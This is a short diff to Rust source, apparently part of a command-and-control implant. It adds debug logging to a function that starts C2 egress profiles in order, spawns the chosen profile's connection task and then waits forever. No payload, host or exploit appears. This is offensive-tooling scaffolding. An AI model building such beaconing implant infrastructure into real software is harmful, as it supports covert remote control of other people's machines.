@@ -201,8 +201,16 @@ fn register_profiles_from_config<E: base64::Engine>(_engine: &E) {
 
 /// Start egress and P2P profiles
 pub async fn start() {
+    utils::print_debug("profiles::start() entered");
+
     let profiles = AVAILABLE_C2_PROFILES.read().expect("Profiles lock");
     let mut egress_order = EGRESS_ORDER.write().expect("Egress order lock");
+
+    utils::print_debug(&format!(
+        "Available profiles: {}, Egress order: {:?}",
+        profiles.len(),
+        egress_order.iter().collect::<Vec<_>>()
+    ));
 
     // Build installed C2 list: egress order first, then any extras
     let mut installed_c2 = Vec::new();
@@ -218,29 +226,46 @@ pub async fn start() {
     }
     *egress_order = installed_c2.clone();
 
+    utils::print_debug(&format!("Installed C2 profiles: {:?}", installed_c2));
+
     // Start first matching egress profile
     let current_id = CURRENT_CONNECTION_ID.load(std::sync::atomic::Ordering::Relaxed) as usize;
+    let mut started_profile = false;
     for (i, egress_c2) in egress_order.iter().enumerate() {
         if i == current_id {
             if let Some(profile) = profiles.get(egress_c2) {
                 if !profile.is_p2p() {
+                    utils::print_debug(&format!("Starting egress profile: {}", egress_c2));
                     let p = profile.clone();
+                    let name = egress_c2.clone();
                     tokio::spawn(async move {
+                        utils::print_debug(&format!("[{}] Profile task spawned, calling start()", name));
                         p.start().await;
+                        utils::print_debug(&format!("[{}] Profile start() returned (should never happen!)", name));
                     });
+                    started_profile = true;
                     break;
                 }
             }
         }
     }
 
+    if !started_profile {
+        utils::print_debug("WARNING: No egress profile was started!");
+    }
+
     // Start all P2P profiles (skipping for now - none registered)
     drop(profiles);
     drop(egress_order);
 
+    utils::print_debug("profiles::start() entering wait forever loop");
+
     // Wait forever
     let (_tx, mut rx) = mpsc::channel::<bool>(1);
     rx.recv().await;
+
+    // This should never be reached
+    utils::print_debug("profiles::start() exited wait loop (should never happen!)");
 }
 
 /// Increment failed connection count for a profile, potentially rotating
